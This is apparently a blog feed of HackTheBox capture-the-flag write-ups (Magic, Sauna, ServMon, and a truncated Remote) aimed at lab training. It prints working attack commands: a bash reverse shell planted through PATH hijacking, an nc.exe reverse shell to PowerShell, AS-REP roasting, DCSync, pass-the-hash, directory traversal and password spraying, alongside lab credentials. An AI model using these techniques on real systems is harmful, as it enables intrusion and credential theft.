command.\n$ find . -type f -user www-data ...\u0026lt;SNIP\u0026gt;... ./var/www/Magic/db.php5 ...\u0026lt;SNIP\u0026gt;... Database dump I can use netstat to confirm that the MySQL server is currently running.\nwww-data@ubuntu:/var/www/Magic$ netstat -tlpn ...\u0026lt;SNIP\u0026gt;... Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name ...\u0026lt;SNIP\u0026gt;... tcp\t0\t0 127.0.0.1:3306 0.0.0.0:* LISTEN - ...\u0026lt;SNIP\u0026gt;... Unfortunately, mysql binary is not present in the box.\nInstead, I could use mysqldump to dump the database.\nwww-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p\u0026#39;iamkingtheseus\u0026#39; ...\u0026lt;SNIP\u0026gt;... LOCK TABLES `login` WRITE; /*!40000 ALTER TABLE `login` DISABLE KEYS */; INSERT INTO `login` VALUES (1,\u0026#39;admin\u0026#39;,\u0026#39;Th3s3usW4sK1ng\u0026#39;); /*!40000 ALTER TABLE `login` ENABLE KEYS */; UNLOCK TABLES; /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */; ...\u0026lt;SNIP\u0026gt;... Shell upgrade to SSH The password is reused by user theseus.\nwww-data@ubuntu:/var/www/Magic$ su theseus Password: theseus@ubuntu:/var/www/Magic$ Before enumeration, I would like to switch to SSH. First, I\u0026rsquo;ll generate a new ssh key.\n→ root@iamf «magic» «10.10.14.169» $ ssh-keygen -f theseus Then, I\u0026rsquo;ll add the newly generated public key to theseus\u0026rsquo;s authorized_keys.\ntheseus@ubuntu:~/.ssh$ echo 'ssh-rsa AAABBBCCCDDD' \u0026gt;\u0026gt; authorized_keys Now I can log in via SSH.\n→ root@iamf «magic» «10.10.14.169» $ ssh -i theseus@10.10.10.185 ...\u0026lt;SNIP\u0026gt;... theseus@ubuntu:~$ id uid=1000(theseus) gid=1000(theseus) groups=100(users),1000(theseus) Shell as root Enumeration Upon enumerating for SUID, there\u0026rsquo;s a binary that doesn\u0026rsquo;t seem a common SUID on Ubuntu.\ntheseus@ubuntu:~$ find / -perm -u=s -type f 2\u0026gt;/dev/null The sysinfo binary is owned by root, but it can be executed by the users group and theseus is a member of that group.\ntheseus@ubuntu:~$ ls -las /bin | grep sysinfo 24 -rwsr-x--- 1 root users 22040 Oct 21 2019 sysinfo I executed the binary and it returns some hardware information on screen that looks similar to lshw, free and other binary related to hardware info. A quick search on Google shows this:\nIt is the same header.\nRunning strings against sysinfo reveals it calls lshw, free, fdisk and some other bins without their absolute path. (I don\u0026rsquo;t have the screenshots to show what it looks like, also can\u0026rsquo;t find the logs on my notes, sorry)\n Absolute path: /bin/sysinfo \u0026ndash;\u0026gt; fixed path, can not be modified except global write access is permitted. (cmiiw) Relative path: sysinfo \u0026ndash;\u0026gt; resolved by user\u0026rsquo;s env, can be modified  Path Hijacking on SUID Knowing the SUID binary uses relative path to call other binaries, I could abuse this by creating, for example, a fake lshw binary that contains a reverse shell.\nFirst, I’ll create a fake lshw in /tmp/iamf folder and add append one liner bash reverse shell.\ntheseus@ubuntu:/tmp$ mkdir iamf theseus@ubuntu:/tmp$ theseus@ubuntu:/tmp$ which lshw /bin/lshw Next, I’ll export /tmp/iamf to environment variable $PATH. Now If I call lshw, the OS will resolve it to the one on /tmp/iamf.\ntheseus@ubuntu:/tmp$ echo -e \u0026#39;#!/bin/sh bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.169/1234 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; iamf/lshw theseus@ubuntu:/tmp$ theseus@ubuntu:/tmp$ export PATH=/tmp/iamf:$PATH theseus@ubuntu:/tmp$ theseus@ubuntu:/tmp$ which lshw /tmp/iamf/lshw After that, I can just execute the sysinfo binary.\nHowever, it then just hangs.\ntheseus@ubuntu:/tmp$ sysinfo ====================Hardware Info==================== That is because it was pwned on my listener.\n→ root@iamf «magic» «10.10.14.169» $ nc -nvlp 1234 listening on [any] 1234 ... connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 36094 root@ubuntu:/tmp/iamf# id uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)     References  https://portswigger.net/support/using-sql-injection-to-bypass-authentication https://exiftool.org/ https://github.com/xapax/security/blob/master/bypass_image_upload.md https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-magic/","summary":"Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I\u0026rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box.","tags":["OSCP-like","OSWE-like","Linux","SQL-injection","Arbitrary-file-upload","Webshell","Path-hijack","SUID","Exiftool","mysqldump"],"title":"HackTheBox - Magic"},{"content":"Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.\nSauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack and obtain the Kerberos TGT from one of the users. The TGT can be cracked to obtain the user\u0026rsquo;s password. With the obtained password, I\u0026rsquo;m able to gain a foothold on the machine. Internal enumeration finds AutoLogon credentials from the registry. BloodHound discovers these credentials can be leveraged to perform a DCSync attack and obtain all of the NTLM hashes from the Active Directory database. Armed with the administrator hash, I\u0026rsquo;m able to gain an interactive shell access as NT Authority\\System.\nSkills Learned  Generating potential usernames AS-Rep roasting BloodHound  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Impacket - https://github.com/SecureAuthCorp/impacket BloodHound - https://github.com/BloodHoundAD/BloodHound  Reconnaissance Nmap Port scanning is the first thing I\u0026rsquo;d do.\n→ root@iamf «sauna» «192.168.2.103» $ nmap -sV -sC -oA nmap/sauna \u0026#39;10.10.10.175\u0026#39; ... \u0026lt;snip\u0026gt; ... PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Egotistical Bank :: Home 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-04-22 00:45:32Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=4/21%Time=5E9F315E%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 6h59m28s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-04-22T00:47:55 |_ start_date: N/A ... \u0026lt;snip\u0026gt; ... Based on the result above, Sauna is an Active Directory domain controller (DC) bundled with the IIS web server.\nnmap also identified Sauna\u0026rsquo;s domain name as EGOTISTICAL-BANK.LOCAL.\n Active Directory domain is similar to web domain both in concept and usage, but the realm is different. Active Directory domain is intended for internal/private networks only (e.g. between branch offices), so it is restricted to the outside world.\n Enumeration TCP 80 - Website Web Pages Overview These are some overview of the web pages.\n    The input vectors doesn\u0026rsquo;t seem injectable.\nGenerating Usernames These are the hints given by the author:\nThe first one is the word \u0026ldquo;roast\u0026rdquo; on the homepage and the contact page. This might refer to the AS-REP roasting attack.\nI got a loan and can\u0026#39;t pay it back, I cant even get a ticket to roast my chestnuts! We will always try to never answer your quetsions - we\u0026#39;re too busy roasting in the sauna, counting our money The second one is the word \u0026ldquo;only one\u0026rdquo;, this can be interpreted as only one of the users is vulnerable.\nMeet the team. So many bank account managers but only one security manager. Sounds about right! From here, I manually collected the team names from the site and created a script to generate usernames based on their first and last names.\n Based on common/best practices of AD user naming conventions\n #!/usr/bin/python3 import sys def convert_name(userfile): f = open(userfile, \u0026#39;r\u0026#39;) for line in f.readlines(): data = \u0026#34;\u0026#34;.join(line.split(\u0026#39;\\n\u0026#39;)) names = data.split(\u0026#39; \u0026#39;) first_letter = names[0][0] first_name = names[0] lastname = names[1] print(f\u0026#39;{first_name}.{lastname}\u0026#39;) print(f\u0026#39;{first_letter}{lastname}\u0026#39;) print(f\u0026#39;{first_letter}.{lastname}\u0026#39;) print(f\u0026#39;{first_letter}a{lastname}\u0026#39;) print(f\u0026#39;{first_letter}e{lastname}\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39; : try: namelist = sys.argv[1].strip() except IndexError: print(\u0026#34;[-] Usage: ./convert-name.py listnames\u0026#34;) exit(-1) convert_name(namelist) Below are the generated usernames from the script.\n→ root@iamf «sauna» «192.168.2.103» $ python convert-name.py listnames Fergus.Smith FSmith F.Smith FaSmith FeSmith Shaun.Coins SCoins S.Coins SaCoins SeCoins Hugo.Bear HBear H.Bear HaBear HeBear Steven.Kerb SKerb S.Kerb SaKerb SeKerb Bowie.Taylor BTaylor B.Taylor BaTaylor BeTaylor Sophie.Driver SDriver S.Driver SaDriver SeDriver Foothold Shell as Fsmith AS-REP Roasting  On Forest Write-up, I briefly explained about AS-REP Roasting.\n With the generated usernames, AS-REP roasting attack can be performed using GetNPUsers.py from Impacket.\n→ root@iamf «sauna» «192.168.2.103» $ GetNPUsers.py -dc-ip \u0026#39;10.10.10.175\u0026#39; -request EGOTISTICAL-BANK.LOCAL/ -usersfile ADUser.txt -format hashcat -output ADuserTGT.txt It successfully obtained FSmith\u0026rsquo;s TGT.\n Cracking TGT hashcat successfully cracked the TGT (performed on my Windows machine).\nC:\\tools\\hashcat6\u0026gt;hashcat.exe -m 18200 \u0026#39;$krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc\u0026#39; C:/tools/rockyou.txt ... \u0026lt;snip\u0026gt; ... $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd3e30ea0797b114bdb36b15e10$737ca27f2844d44e868f9ab86f72af0d8d27ce9385864d763a4dae0205efb764a954abe02e0ed1006af6f42268fbb6250f9c2f515fc4478b96051d124cb110aba85e960081b69ea9f21b4b761be007f1655a9a79ac00e2495c8125d56ff31b97b9f7021a84cd232d960ed29d5e536a6893aa0ec722c5132d80f61a3b04559409a5933ae1426a8170a14f673ff0cd5449d9e013193a1c75c4293404c76c42dd20b3f6d0e30cbf946566a0bd09d075781a18062f96ca083e9a7394cf6cd6c7e17e1f926cb4b32efa18d850582185e9cfb9f0b7f7d588ff9ff3ca9fed5bbd7c1a29e38d626f4ac7b6e756e0c81d3b21b7bb956d0a3fe0368a66bc1daa30140bffcc:Thestrokes23 Session..........: hashcat Status...........: Cracked Hash.Name........: Kerberos 5, etype 23, AS-REP Hash.Target......: $krb5asrep$23$FSmith@EGOTISTICAL-BANK.LOCAL:c4f6edd...0bffcc ... \u0026lt;snip\u0026gt; ... The password is Thestrokes23.\nRemote Access This user can login remotely with evil-winrm.\n→ root@iamf «sauna» «192.168.2.103» $ evil-winrm -i \u0026#39;10.10.10.175\u0026#39; -u fsmith -p \u0026#39;Thestrokes23\u0026#39; User flag is done here.\n   Privilege Escalation Shell as svc_loanmgr Enumeration WinPEAS discovered that svc_loanmanager has an autologon credential.\n   But based on rpcclient, it\u0026rsquo;s actually svc_loanmgr.\n   This account also can login remotely.\n→ root@iamf «sauna» «192.168.2.103» $ evil-winrm -i \u0026#39;10.10.10.175\u0026#39; -u svc_loanmgr -p \u0026#39;Moneymakestheworldgoround!\u0026#39; Evil-WinRM shell v2.3 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc_loanmgr\\Documents\u0026gt; Shell as NT Authority\\System Enumeration with BloodHound I ran the second WinPEAS scan, but found nothing particularly interesting (this was prior to zerologon). Since this is an AD environment, I can try BloodHound.\nI copied SharpHound.exe (the ingestor) to Sauna using evilwin-rm and ran it to start collecting data.\n evilwin-rm has capability to transfer files directly between my machine and the remote (Sauna). The keywords are download and upload.\n    It finished within a few seconds.\nI copied the collected data to my machine and loaded it to BloodHound with drag and drop.\n   After trying a few of BloodHound\u0026rsquo;s prebuilt queries, BloodHound reveals that svc_loanmgr has GetChangesAll and GetChanges permissions on the domain.\n I can access the help section by right clicking the edge. So, GetChanges and GetChangesAll are in conjunction with DS-Replication-Get-Changes-All. This grants svc_loanmgr ability to perform the DCSync attack.\n The \u0026ldquo;Abuse Info\u0026rdquo; section contains how to abuse these privileges using mimikatz\n Credential Dumping Since Windows Defender typically doesn\u0026rsquo;t get along with mimikatz, I use secretsdump.py to perform a DCSync attack just like I did on Forest.\n→ root@iamf «sauna» «192.168.2.103» $ secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:\u0026#39;Moneymakestheworldgoround!\u0026#39;@10.10.10.175 -just-dc-ntlm  Pass the hash - psexec.py Now I can use psexec.py to perform pass-the-hash using administrator hash to gain shell access as local system.\n→ root@iamf «sauna» «192.168.2.103» $ psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff administrator@htb.sauna  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-sauna/","summary":"Sauna is another Active Directory box with easy difficulty from Hack The Box that covers several Active Directory kill chain techniques, such as AS-REP roasting attack, finding credentials on registry, and a DCSync attack to pull Active Directory password hashes.\nSauna starts by generating a list of potential usernames from its website, which is then used to perform AS-REP roasting attack and obtain the Kerberos TGT from one of the users.","tags":["OSCP-plus","Windows","Active-Directory","Domain-controller","ASREP-roasting","BloodHound","SharpHound","DCSync","secretsdump.py","psexec.py"],"title":"HackTheBox - Sauna"},{"content":"ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user\u0026rsquo;s dekstops. A Path Traversal vulnerability on the installed NVMS-1000 is exploited to obtain the password list. With a password spray attack, I\u0026rsquo;m able to gain a foothold on the system .\nIn the NSClient++ default installation folder, there is a config file which contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\\System.\nSkills Learned  Directory/Path Traversal NVMS-1000 exploitation NSClient-0.5.2.35 exploitation Port Forwarding/Tunneling  Tools  CrackMapExec - https://github.com/byt3bl33d3r/CrackMapExec BurpSuite - https://portswigger.net/burp NSClient-0.5.2.35 Exploit PoC - https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  Reconnaissance Nmap → root@iamf «servmon» «10.10.14.23» $ nmap -sC -sV -oA nmap/initial-servmon \u0026#39;10.10.10.184\u0026#39;  -sC, to scan with default script -sV, to scan service version -oA, to save the output in all format (xml, nmap, gnmap) -v, verbose mode.  PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM \u0026lt;DIR\u0026gt; Users | ftp-syst: |_ SYST: Windows_NT 22/tcp open ssh OpenSSH for_Windows_7.7 (protocol 2.0) | ssh-hostkey: | 2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA) | 256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA) |_ 256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519) 80/tcp open http | fingerprint-strings: | GetRequest, HTTPOptions, RTSPRequest: | HTTP/1.1 200 OK | Content-type: text/html | Content-Length: 340 | Connection: close | AuthInfo: | \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; | \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; | \u0026lt;head\u0026gt; | \u0026lt;title\u0026gt;\u0026lt;/title\u0026gt; | \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; | window.location.href = \u0026#34;Pages/login.htm\u0026#34;; | \u0026lt;/script\u0026gt; | \u0026lt;/head\u0026gt; | \u0026lt;body\u0026gt; | \u0026lt;/body\u0026gt; | \u0026lt;/html\u0026gt; | NULL: | HTTP/1.1 408 Request Timeout | Content-type: text/html | Content-Length: 0 | Connection: close |_ AuthInfo: |_http-title: Site doesn\u0026#39;t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 5666/tcp open tcpwrapped 6699/tcp open napster? 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: | HTTP/1.1 404 | Content-Length: 18 | Document not found | GetRequest: | HTTP/1.1 302 | Content-Length: 0 | Location: /index.html |_ refox/68.0 | http-title: NSClient++ |_Requested resource was /index.html | ssl-cert: Subject: commonName=localhost | Not valid before: 2020-01-14T13:24:20 |_Not valid after: 2021-01-13T13:24:20 |_ssl-date: TLS randomness does not represent time 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port80-TCP:V=7.80%I=7%D=4/12%Time=5E93410A%P=x86_64-pc-linux-gnu%r(NULL SF:,6B,\u0026#34;HTTP/1\\.1\\x20408\\x20Request\\x20Timeout\\r\\nContent-type:\\x20text/ht SF:ml\\r\\nContent-Length:\\x200\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x20\\r\\n SF:\\r\\n\u0026#34;)%r(GetRequest,1B4,\u0026#34;HTTP/1\\.1\\x20200\\x20OK\\r\\nContent-type:\\x20tex SF:t/html\\r\\nContent-Length:\\x20340\\r\\nConnection:\\x20close\\r\\nAuthInfo:\\x .... Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: -28s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020-04-12T16:27:15 |_ start_date: N/A RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box.\nBesides these standard ports, there are some interesting services installed on the box:\n FTP with anonymous login on port 21, SSH service on port 22 HTTPS service on non-standard port 8443.  This machine probably is not an Active Directory.\nEnumeration TCP 21 - FTP ... \u0026lt;snip\u0026gt; ... 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) |_01-18-20 12:05PM \u0026lt;DIR\u0026gt; Users ... \u0026lt;snip\u0026gt; ... Based on nmap scans, the FTP root directory contains the Users folder. Inside the Users folder, I found two subfolders, one is Nathan and the other is Nadine. Both of these users' folders contain a text file, I copied these files to my machine.\nThe first file is Confidential.txt. It contains a note from Nadine to Nathan.\nNathan, I left your Passwords.txt file on your Desktop. Please remove this once you have edited it yourself and place it back into the secure folder. Regards Nadine The second file is Notes to do.txt. It contains a to do list.\n1) Change the password for NVMS - Complete 2) Lock down the NSClient Access - Complete 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint I\u0026rsquo;ll note that there\u0026rsquo;s a Password.txt text on Nathan\u0026rsquo;s desktop and the uncompleted to do.\nTCP 445 - SMB Anonymous login is not allowed, so nothing to see here.\nTCP 80 - Website Visiting port 80 redirects me to a login page on Pages/login.htm\n Based on Google, NVSMS-1000 is a software for CCTV monitoring. I don\u0026rsquo;t find the default credentials, and it doesn\u0026rsquo;t seem to work with common credentials.\nExploit-DB A quick search on exploit-db shows it is vulnerable to Directory Traversal.\n PoC: https://www.exploit-db.com/exploits/47774\n # Title: NVMS-1000 - Directory Traversal # Date: 2019-12-12 # Author: Numan Türle # Vendor Homepage: http://en.tvt.net.cn/ # Version : N/A # Software Link : http://en.tvt.net.cn/products/188.html POC --------- GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1 Host: 12.0.0.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7 Connection: close Response --------- ; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 There\u0026rsquo;s no version is specified, but I\u0026rsquo;ll give it a try.\nTCP 8443 - NSClient++ Exploit-DB  It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding \u0026lsquo;exploit\u0026rsquo; to the keyword pops up an exploit link that refers to exploit-DB:\n Manual PoC: https://www.exploit-db.com/exploits/46802 Scripted PoC: https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  Foothold Shell as nadine  I\u0026rsquo;ve added htb.servmon to my /etc/hosts, so it will resolve to 10.10.10.184. I know htb.servmon looks weird, but that\u0026rsquo;s me in the past hehe..\n NVMS-1000 Directory Traversal - Obtain Passwords.txt I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000\n It returns a list of passwords\n Password spraying I created a usernames list and a password list:\n  users.txt\nnathan nadine   passwords.txt\n1nsp3ctTh3Way2Mars! Th3r34r3To0M4nyTrait0r5! B3WithM30r4ga1n5tMe L1k3B1gBut7s@W0rk 0nly7h3y0unGWi11F0l10w IfH3s4b0Utg0t0H1sH0me Gr4etN3w5w17hMySk1Pa5$   With these, a password spray can be performed using CrackMapExec. It hits on nadine:L1k3B1gBut7s@W0rk pair.\n→ root@iamf «servmon» «10.10.14.23» $ crackmapexec smb htb.servmon -u users -p passwords ... \u0026lt;snip\u0026gt; ... SMB 10.10.10.184 445 SERVMON [+] SERVMON\\nadine:L1k3B1gBut7s@W0rk ... \u0026lt;snip\u0026gt; ... SSH access The credentials also work on SSH.\n→ root@iamf «servmon» «10.10.14.23» $ ssh nadine@htb.servmon    Privilege Escalation Shell as NT Authority\\System Obtain NSClient++ password 3) Upload the passwords 4) Remove public access to NVMS 5) Place the secret files in SharePoint Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.\nPS C:\\\u0026gt; gc \u0026#39;Program Files\\NSClient++\\nsclient.ini\u0026#39;    I\u0026rsquo;ll try the scripted PoC. But before that, I\u0026rsquo;ll need to tunnel the connection first. This is because the config file is set to local only, so I can\u0026rsquo;t perform exploit directly from outside.\nSSH Tunneling SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I\u0026rsquo;ll create another SSH connection for tunneling.\n→ root@iamf «servmon» «10.10.14.23» $ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 -L 8443:127.0.0.1:8443 means it will forward any connection on my localhost port 8443 to remote localhost on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.\nNSClient++ Exploit PoC First, I\u0026rsquo;ll create a batch, called sans.bat file on my machine.\n@echo off C:\\Temp\\nc.exe 10.10.14.23 443 -e powershell.exe Once it created, I\u0026rsquo;ll transfer the file to ServMon on C:\\temp\\ via python http server along with netcat for windows.\n→ root@iamf «servmon» «10.10.14.23» $ Python -m SimpleHTTPServer 80 Get the hosted files on ServMon\nPS C:\\\u0026gt; Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat PS C:\\\u0026gt; Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe Now I\u0026rsquo;ll setup a listener on my Kali.\n→ root@iamf «servmon» «10.10.14.23» $ nc -nlvvp 443 Then I can just run the exploit and wait on my listener.\n→ root@iamf «servmon» «10.10.14.23» $ python3 nsRCE.py -t 127.0.0.1 -P 8443 -p \u0026#39;ew2x6SsGTxjRwXOT\u0026#39; -c \u0026#34;c:\\temp\\reverse.bat\u0026#34; Now I have an interactive shell as NT Authority\\SYSTEM.\n  References  https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-servmon/","summary":"ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user\u0026rsquo;s dekstops. A Path Traversal vulnerability on the installed NVMS-1000 is exploited to obtain the password list. With a password spray attack, I\u0026rsquo;m able to gain a foothold on the system .\nIn the NSClient++ default installation folder, there is a config file which contains a set of credentials.","tags":["OSCP-like","Windows","Directory-traversal","NVMS-1000","NSClient","Tunneling","Port-forwarding"],"title":"HackTheBox - ServMon"},{"content":"Remote features an instance of Umbraco CMS which is vulnerable to an authenticated remote code execution (RCE). Enumeration on publicly accessible backup on NFS share finds credentials, which allows me to gain a foothold on the system. From there, internal enumeration with WinPEAS finds two interesting privilege escalation vectors, the first one with TeamViewer7 and the other one is the ability to modify and restart an unquoted service path. TeamViewer7 is found to be vulnerable to CVE-2019-18988, Metasploit has a module to exploit this CVE and harvest the TeamViewer credentials. The credentials are work with the administrator account.\nSkills Learned  NFS enumeration Umbraco CMS 7.12.4 exploitation Metasploit  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux metasploit - Preinstalled in Kali Linux nfs-common - apt install nfs-common  Reconnaissance Nmap → root@iamf «remote» «10.10.14.3» $ nmap -sC -sV -oA scans/initial-remote \u0026#39;10.10.10.180\u0026#39;  -sC, to scan with default script -sV, to scan service version -oA, to save the output to all format (xml, nmap, gnmap) -v, verbose mode.  ... \u0026lt;snip\u0026gt; ... Host is up (0.20s latency). Not shown: 993 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd #1 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) #2 |_http-title: Home — Acme Widgets 111/tcp open rpcbind 2–4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/tcp6 rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 2,3,4 111/udp6 rpcbind | 100003 2,3 2049/udp nfs | 100003 2,3 2049/udp6 nfs | 100003 2,3,4 2049/tcp nfs | 100003 2,3,4 2049/tcp6 nfs | 100005 1,2,3 2049/tcp mountd | 100005 1,2,3 2049/tcp6 mountd | 100005 1,2,3 2049/udp mountd | 100005 1,2,3 2049/udp6 mountd | 100021 1,2,3,4 2049/tcp nlockmgr | 100021 1,2,3,4 2049/tcp6 nlockmgr | 100021 1,2,3,4 2049/udp nlockmgr | 100021 1,2,3,4 2049/udp6 nlockmgr | 100024 1 2049/tcp status | 100024 1 2049/tcp6 status | 100024 1 2049/udp status |_ 100024 1 2049/udp6 status 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1–3 (RPC #100005) #3 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results: |_clock-skew: -25s | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2020–03–28T21:04:26 |_ start_date: N/A ... \u0026lt;snip\u0026gt; ... The result shows a bunch of open ports.\nEnumeration TCP 21 - FTP Anonymous login is allowed, but nothing here.\nTCP 80 - Website In contact menu, there\u0026rsquo;s a button that points to http://10.10.10.180/umbraco/#/login/false?returnPath=%252Fforms\nThe link brought me into Umbraco\u0026rsquo;s login page.\n  Brute forcing some common credentials with Burp doesn't show any difference. TCP 2049 - NFS NFS shares can be enumerated using the showmount command.\n If you don’t have it, install with sudo apt install nfs-common\n → root@iamf «remote» «10.10.14.3» $ showmount -e \u0026#39;10.10.10.180\u0026#39; Export list for 10.10.10.180: /site_backups I can mount the share to my Kali because it is accessible to everyone.\n→ root@iamf «remote» «10.10.14.3» $ mount -t nfs 10.10.10.180:/site_backups /mnt/iamf When I ran the find command on the mounted NFS, I discovered two interesting files: embraco.config and umbraco.sdf.\n→ root@iamf «iamf» «10.10.14.3» $ find . -type f 2\u0026gt;/dev/null ...\u0026lt;snip\u0026gt;... ./App_Data/TEMP/PluginCache/umbraco-plugins.INTRANET.list ./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.hash ./App_Data/TEMP/PluginCache/umbraco-plugins.REMOTE.list ./App_Data/umbraco.config ./App_Data/Umbraco.sdf ./App_Plugins/ModelsBuilder/modelsbuilder.controller.js 